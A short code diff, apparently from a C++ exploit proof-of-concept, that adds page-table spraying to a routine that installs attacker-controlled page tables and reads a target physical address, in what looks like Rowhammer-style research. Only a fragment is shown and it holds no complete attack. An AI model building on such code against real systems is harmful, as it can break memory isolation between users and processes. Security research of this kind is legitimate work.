@@ -137,8 +137,10 @@ int main() {
         auto addr       = (void*)(SPRAY_START + PAGEBLOCK_SIZE);
         auto bait_pages = strided_addresses(pageblock, 1ULL << 10, PAGE_SIZE);
         erase_pages(bait_pages, random_pages);
+        auto spray_pages = strided_addresses((void*)SPRAY_START, NR_PAGE_TABLES_SPRAY,
+                                       kX86_64PageTableSpan);
 
-        pt_install(bait_pages, pt_target, addr, fd);
+        pt_install(bait_pages, pt_target, addr, spray_pages, fd);
 
         unsigned long value = rubench_read_phys(target_phys);
         auto file_phys      = rubench_va_to_pa(fd_ptr);
